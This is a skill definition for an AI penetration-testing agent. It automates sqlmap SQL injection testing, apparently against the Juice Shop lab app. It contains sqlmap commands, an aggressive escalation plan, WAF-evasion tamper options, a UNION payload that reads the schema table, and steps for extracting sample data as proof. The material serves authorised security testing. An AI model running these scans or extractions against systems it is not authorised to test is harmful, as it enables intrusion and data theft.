---
name: sql-injection
description: >
  Automate SQL injection testing via sqlmap against identified injection surfaces.
  Use when an analysis agent has identified potential SQL injection endpoints/parameters
  in hypotheses and needs to confirm exploitability with automated tooling. Triggers on:
  (1) testing a specific URL + parameter for SQL injection, (2) confirming a hypothesis
  from the analysis phase with real injection attempts, (3) extracting data from a
  confirmed SQL injection, (4) generating evidence for the findings deliverable.
---

# SQLInjectionSkill

Automate SQL injection testing using sqlmap. Analysis agents produce hypotheses about
which endpoints and parameters are injectable — this skill turns those hypotheses into
confirmed findings by running sqlmap against each candidate.

## Workflow

1. Receive injection hypothesis from `hypotheses_injection.md` (endpoint + parameter + suspected technique)
2. Run sqlmap against the endpoint: `python3 skills/sql-injection/scripts/run_sqlmap.py <TARGET_URL><PATH> --param <PARAM>`
3. If injection is confirmed, optionally extract sample data as proof
4. Integrate the confirmed finding into `findings_injection.md`

## Usage Patterns

### Test a GET parameter

```bash
python3 skills/sql-injection/scripts/run_sqlmap.py \
  "http://TARGET:3000/rest/products/search?q=test" \
  --param q \
  --dbms sqlite \
  --level 3 --risk 2
```

### Test a POST JSON body

```bash
python3 skills/sql-injection/scripts/run_sqlmap.py \
  "http://TARGET:3000/rest/user/login" \
  --param email \
  --method POST \
  --data '{"email":"test","password":"test"}' \
  --dbms sqlite
```

### Test with authentication

```bash
python3 skills/sql-injection/scripts/run_sqlmap.py \
  "http://TARGET:3000/api/Products/1" \
  --param id \
  --headers "Authorization: Bearer <TOKEN>" \
  --dbms sqlite
```

## Output Schema

`run_sqlmap.py` produces JSON matching this structure:

```json
{
  "success": true,
  "target_url": "http://target:3000/rest/products/search?q=test",
  "parameter": "q",
  "injectable": true,
  "technique": "UNION query",
  "dbms": "SQLite",
  "payloads": [
    "test' UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"
  ],
  "evidence": {
    "tables": ["Users", "Products", "BasketItems"],
    "sample_data": "..."
  },
  "command": "sqlmap -u ... --batch ...",
  "raw_output": "..."
}
```

## Sqlmap Configuration

### Recommended flags for Juice Shop

| Flag | Value | Reason |
|------|-------|--------|
| `--batch` | (always) | Non-interactive mode — required for automated execution |
| `--dbms` | sqlite | Juice Shop uses SQLite via Sequelize |
| `--level` | 3 | Test headers and cookies in addition to GET/POST |
| `--risk` | 2 | Include time-based and OR-based tests |
| `--technique` | BEUST | Boolean, Error, Union, Stacked, Time-based |
| `--threads` | 4 | Parallel requests (safe for local/single-user target) |
| `--tamper` | (optional) | space2comment, between — if WAF is detected |

### Escalation strategy

1. Start with `--level=3 --risk=2` (covers most cases)
2. If no injection found, try `--level=5 --risk=3` (more aggressive)
3. If WAF detected, add `--tamper=space2comment,between`
4. If time-based only, increase `--time-sec=10`

## Integration with Pipeline

- **Input**: Hypotheses from `hypotheses_injection.md` — each hypothesis specifies an endpoint, parameter, and expected injection type
- **Output**: Confirmed findings for `findings_injection.md` — each finding includes sqlmap's confirmation, technique used, and extracted evidence
- **Evidence**: sqlmap output logs and extracted data serve as proof of exploitation

## References

- **sqlmap options**: See [references/sqlmap-options.md](references/sqlmap-options.md)
